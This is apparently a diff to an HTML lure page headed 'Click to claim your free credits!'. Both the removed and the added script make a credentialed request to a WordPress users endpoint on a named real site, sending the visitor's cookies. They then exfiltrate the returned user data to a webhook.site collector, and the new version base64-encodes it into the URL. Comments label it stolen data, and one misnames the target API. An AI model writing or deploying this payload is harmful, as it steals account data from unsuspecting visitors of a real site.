@@ -5,21 +5,15 @@
 </head>
 <body>
   <h1>Click to claim your free credits!</h1>
-  <script>
-    // Step 1: Fetch sensitive data from ClassDojo API
-    fetch('https://blog.arlo.com/wp-json/wp/v2/users/me', {
-      credentials: 'include' // Sends user's cookies
-    })
-    .then(response => response.json())
-    .then(data => {
-      // Step 2: Send stolen data to your server
-      fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73', { // Replace with your URL
-        method: 'GET',
-        mode: 'no-cors',
-        body: JSON.stringify(data)
-      });
-    })
-    .catch(error => console.error('Error:', error));
-  </script>
+ <script>  
+fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
+  credentials: 'include' // Send cookies!  
+})  
+.then(r => r.json())  
+.then(data => {  
+  // Exfiltrate cookies + user data to your server  
+  fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73?leak=' + btoa(JSON.stringify(data)));  
+});  
+</script>  
 </body>
 </html>
